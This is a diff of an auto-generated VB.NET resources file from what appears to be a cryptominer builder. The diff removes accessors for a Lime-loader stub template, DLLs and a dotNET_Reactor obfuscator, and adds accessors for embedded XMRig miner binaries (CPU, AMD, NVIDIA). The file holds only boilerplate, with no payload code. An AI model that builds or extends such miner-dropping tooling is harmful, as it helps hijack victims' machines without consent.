@@ -61,69 +61,68 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property DLL() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("DLL", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property DLL4() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("DLL4", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property dotNET_Reactor() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("dotNET_Reactor", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized string similar to 
-        '''&apos;------------------------------------------
-        '''&apos;An Modified Lime loader | Nyan Cat 8/27/2018
-        '''&apos;
-        '''&apos;https://github.com/NYAN-x-CAT/Lime-Loader
-        '''&apos;------------------------------------------
-        '''
-        '''Imports System.IO
-        '''Imports System
-        '''Imports System.Reflection
-        '''Imports System.Runtime.InteropServices
-        '''Imports System.Security.Cryptography
-        '''Imports System.Windows.Forms
-        '''Imports System.Threading
-        '''
-        '''
-        '''&apos;%ASSEMBLY%&lt;Assembly: AssemblyTitle(&quot;%Title%&quot;)&gt; 
-        '''&apos;%ASSEMBLY%&lt;Assembly: AssemblyDescription(&quot;%Description%&quot;)&gt; 
-        '''&apos;%ASSEMBLY%&lt; [rest of string was truncated]&quot;;.
-        '''</summary>
-        Friend ReadOnly Property Main_() As String
-            Get
-                Return ResourceManager.GetString("Main_", resourceCulture)
-            End Get
-        End Property
-        
-        '''<summary>
         '''  Looks up a localized resource of type System.Drawing.Bitmap.
         '''</summary>
         Friend ReadOnly Property nyan() As System.Drawing.Bitmap
             Get
                 Dim obj As Object = ResourceManager.GetObject("nyan", resourceCulture)
                 Return CType(obj,System.Drawing.Bitmap)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized string similar to Public Class Program
+        '''
+        '''    Public Shared Sub Main()
+        '''
+        '''    End Sub
+        '''
+        '''End Class
+        '''.
+        '''</summary>
+        Friend ReadOnly Property Program() As String
+            Get
+                Return ResourceManager.GetString("Program", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property Project1() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("Project1", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig_amd_notls() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig_amd_notls", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig_nvidia() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia", resourceCulture)
+                Return CType(obj,Byte())
             End Get
         End Property
     End Module
